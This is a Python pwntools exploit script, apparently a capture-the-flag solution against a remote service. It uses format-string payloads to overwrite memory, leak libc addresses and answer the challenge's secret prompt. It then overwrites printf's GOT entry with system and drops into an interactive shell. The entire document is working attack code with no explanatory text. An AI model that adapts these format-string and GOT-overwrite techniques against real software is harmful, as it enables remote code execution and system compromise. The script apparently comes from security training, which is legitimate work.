from pwn import *
from time import *
r = remote("csie.ctf.tw", 10129)

###Useful address
libc_start_main_offset = 0x21ab0
system_offset = 0x4f440
#execve_offset = 0x4f2c5
libc_start_main_got = 0x6011e0
a_offset = 0x6012ac
printf_got = 0x601230

###Leak data + Prob1
p = b'%45068c%24$hn%19138c%25$hnABC%8$pABC%9$pDEF%26$s'.ljust(0x40,b'G')
p+=p64(a_offset)
p+=p64(a_offset+2)
p+=p64(libc_start_main_got)
r.recvuntil('name ?')
r.send(p)

###Prob2
a = r.recvuntil('secret :P ?')
a = a[a.find(b'ABC')+3:]
p = p64(int(a[2:a.find(b'ABC')],16))+p64(int(a[a.find(b'ABC')+5:a.find(b'DEF')],16))
r.send(p)

###Prob3
start_libc = u64(a[a.find(b'DEF')+3:a.find(b'GGGGG')].ljust(0x8,b'\x00'))
libc_base = start_libc-libc_start_main_offset
system = system_offset+libc_base
system_a = [system&0xff,(system&0xffff00)>>8]
system_a[1]-=system_a[0]
p = b'%'+str(system_a[0]).encode('utf-8')+b'c%13$hhn%'+str(system_a[1]).encode('utf-8')+b'c%14$hn'
p = p.ljust(0x18,b'\x00')
p+=p64(printf_got)
p+=p64(printf_got+1)
print(p)
r.send(p)
r.recv()
r.interactive()
r.send('sh')
